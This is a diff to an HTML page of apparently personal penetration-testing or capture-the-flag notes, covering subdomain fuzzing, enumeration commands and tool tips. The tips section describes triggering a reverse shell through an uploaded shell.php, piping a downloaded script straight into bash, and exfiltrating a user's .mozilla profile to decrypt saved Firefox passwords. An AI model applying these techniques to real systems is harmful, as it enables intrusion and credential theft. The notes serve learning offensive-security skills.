@@ -89,13 +89,14 @@
 <p><span style="font-size: 22px;"><span style="font-family: Helvetica;">3. </span><span style="color: rgb(243, 121, 52); font-family: Helvetica;"><strong>Sub-domain fuzzing:</strong></span><span style="font-family: Helvetica;"> - use ffuf - also use Seclists/DNS/subdomains top .txts</span></span></p>
 <p><span style="font-size: 22px;">Do not forget to check for <span style="color: rgb(243, 121, 52);">extension types</span> too when directory fuzzing (-x php,html,txt)</span></p>
 <p><span style="font-size: 22px;"><span style="font-family: Helvetica;">4. </span><span style="color: rgb(41, 105, 176); font-family: Helvetica;"><strong>Add to /etc/hosts:</strong></span><span style="font-family: Helvetica;">&nbsp;printf &quot;%s\t%s\n\n&quot; &quot;$IP&quot; &quot;enter the domains/websites&quot; | sudo tee -a /etc/hosts (set IP by doing IP=xx.xx.xx.xx)</span></span></p>
-<p><span style="font-size: 22px;">ss -tulnp - great way to find port numbers (eg you may find a running SQL server and type)</span></p>
-<p><span style="font-size: 22px;">getent- retrieves information from various DBs - passwdfile, group etc.</span></p>
-<p><span style="font-size: 22px;">getent - usage: getent passwd, &nbsp;getend passwd &lt;username&gt;</span></p>
+<p><span style="font-size: 22px;">5. ss -tulnp - great way to find port numbers (eg you may find a running SQL server and type)</span></p>
+<p><span style="font-size: 22px;">6. getent- retrieves information from various DBs - passwdfile, group etc.</span></p>
+<p><span style="font-size: 22px;">7. getent - usage: getent passwd, &nbsp;getend passwd &lt;username&gt;</span></p>
 <p><br></p>
 <p>-------------------------------------------------------------------------------------------------------------------------------------------------------------</p>
 <p><span style='font-size: 28px; font-family: "Arial Black", Gadget, sans-serif;'><u>Quick Tips: TOOLS</u></span></p>
 <p><span style="font-size: 22px; font-family: Helvetica;">1. using <strong><span style="color: rgb(65, 168, 95);">curl </span></strong>to get reverse shell - you may not need all the directories for example <a href="http://abc.com/abc/file_uploads/shell.php">http://abc.com/abc/file_uploads/shell.php</a> - you may need /abc/ part of it</span></p>
+<p><span style="font-size: 22px; font-family: Helvetica;">1. using <strong><span style="color: rgb(65, 168, 95);">curl </span></strong>download and pipe into base - you can download a tool using curl and pipe direct into bash: curl <script_url> | bash </span></p>
 <p><span style="font-size: 22px;"><span style="font-family: Helvetica;">2. If you come across a </span><span style="color: rgb(184, 49, 47); font-family: Helvetica;"><strong>.Mozilla</strong></span><span style="font-family: Helvetica;"> file (in a users dir) - go to /tmp dir and run: zip -r /tmp/mozilla.rar /home/username/.mozilla and then transfer it . Then download: </span><span style="color: rgb(184, 49, 47); font-family: Helvetica;"><strong>firefox decrypt</strong></span><span style="font-family: Helvetica;"> from Github</span></span></p>
 <p><span style="font-size: 22px;"><span style="font-family: Helvetica;">3. </span><span style="color: rgb(243, 121, 52); font-family: Helvetica;"><strong>Ffuf</strong></span><span style="font-family: Helvetica;"> - remove unwanted sizes - use -fs &lt;size&gt;&nbsp;</span></span></p>
 <p><span style="font-size: 22px; font-family: Helvetica;">4. Update only one tool: sudo apt-get install --only-upgrade &lt;tool name&gt;</span></p>
